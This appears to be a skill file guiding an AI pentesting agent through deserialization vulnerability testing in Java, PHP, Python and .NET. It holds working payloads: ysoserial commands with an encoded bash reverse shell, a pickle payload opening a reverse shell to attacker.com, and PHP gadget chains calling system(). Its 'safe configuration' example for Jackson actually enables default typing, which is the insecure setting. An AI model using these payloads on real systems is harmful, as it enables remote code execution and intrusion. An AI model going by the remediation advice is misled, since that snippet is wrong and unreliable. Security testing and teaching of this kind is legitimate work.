---
name: deserialization-testing
description: Professional skills and methodology for deserialization vulnerability testing
version: 1.0.0
---

# Deserialization Vulnerability Testing

## Overview

Deserialization vulnerabilities arise when an application deserializes untrusted data, potentially leading to remote code execution, denial of service, and more. This skill provides methods for detecting, exploiting, and preventing deserialization vulnerabilities.

## Vulnerability Mechanics

When an application deserializes data into objects, if the data comes from an untrusted source, an attacker can craft malicious serialized data that executes arbitrary code during deserialization.

## Common Formats

### Java

**Common libraries:**
- Native Java serialization
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Common functions:**
- unserialize()
- json_decode()

### Python

**Common modules:**
- pickle
- yaml
- json

### .NET

**Common classes:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Testing Methodology

### 1. Identify Serialized Data

**Java serialization signatures:**
```
AC ED 00 05 (十六进制)
rO0 (Base64)
```

**PHP serialization signatures:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle signatures:**
```
\x80\x03
```

### 2. Locate Deserialization Points

**Common locations:**
- Cookie values
- Session data
- API parameters
- File uploads
- Cached data
- Message queues

### 3. Java Deserialization

**Exploiting Apache Commons Collections:**
```java
// 使用ysoserial生成Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Common gadget chains:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP Deserialization

**Basic test:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Magic method exploitation:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**Basic test:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Exploitation Techniques

### Java RCE

**Using ysoserial:**
```bash
# 生成Payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64编码
base64 -w 0 payload.bin
```

**Manual construction:**
```java
// 使用Gadget链构造恶意对象
// 参考ysoserial源码
```

### PHP RCE

**Exploiting POP chains:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Bypass Techniques

### Encoding Bypass

**Base64 encoding:**
```
原始: rO0ABXNy...
编码: ck8wQUJYTnk...
```

**URL encoding:**
```
%72%4F%00%AB...
```

### Filter Bypass

**Using different gadget chains:**
- If CommonsCollections is filtered, try Spring
- If a particular version is filtered, try other versions

### Class Name Obfuscation

**Using reflection:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Tool Usage

### ysoserial

```bash
# 列出可用Gadget
java -jar ysoserial.jar

# 生成Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# 生成Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# 列出可用Gadget
./phpggc -l

# 生成Payload
./phpggc Monolog/RCE1 system id

# 生成编码Payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Intercept requests containing serialized data
2. Use a plugin to generate payloads
3. Replace the original data
4. Observe the response

## Verification and Reporting

### Verification Steps

1. Confirm you can control the serialized data
2. Verify that deserialization triggers code execution
3. Assess the impact (RCE, data leakage, etc.)
4. Document a complete PoC
5. Use the `report_finding` tool to record confirmed vulnerabilities in the platform (the sole entry point for recording vulnerabilities in this platform); the fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Report Essentials

- Vulnerability location and serialized data format
- Gadget chain or exploitation method used
- Complete exploitation steps and PoC
- Remediation recommendations (input validation, using safe serialization formats, etc.)

## Protective Measures

### Recommended Solutions

1. **Avoid deserializing untrusted data**
   - Use JSON instead
   - Use safe serialization formats

2. **Input validation**
   ```java
   // 白名单验证类名
   private static final Set<String> ALLOWED_CLASSES = 
       Set.of("com.example.SafeClass");
   
   private Object readObject(ObjectInputStream ois) {
       // 验证类名
       // ...
   }
   ```

3. **Use safe configuration**
   ```java
   // Jackson配置
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD, 
       JsonAutoDetect.Visibility.ANY);
   ```

4. **ClassLoader isolation**
   - Use a custom ClassLoader
   - Restrict which classes can be loaded

5. **Monitoring and logging**
   - Log deserialization operations
   - Monitor for abnormal behavior

## Important Notes

- Only test in authorized testing environments
- Pay attention to gadget chain differences across library versions
- Watch for payload size limits during testing
- Understand the versions of the target application's dependency libraries
